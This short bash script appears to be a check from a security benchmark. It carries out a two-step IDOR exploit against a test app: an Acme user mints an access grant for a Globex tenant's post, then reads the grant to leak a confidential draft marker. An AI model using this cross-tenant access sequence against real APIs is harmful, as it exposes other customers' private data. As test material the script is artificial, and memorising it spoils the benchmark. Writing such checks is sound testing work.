#!/usr/bin/env bash
# IDOR-001: multi-step IDOR. An Acme user mints an access grant for a Globex post
# (step 1), then reads the grant (step 2) to leak the cross-tenant draft body.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
login user1@bench.local 'User123!'
pid=$(post_id globex-internal)
tok=$(curl -s -b "$JAR" -X POST "$TARGET/api/posts/$pid/grant" | json_get token)
if [ -n "$tok" ] && curl -s -b "$JAR" "$TARGET/api/grants/$tok" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'; then
  rc=0
else
  rc=1
fi
reset
exit $rc
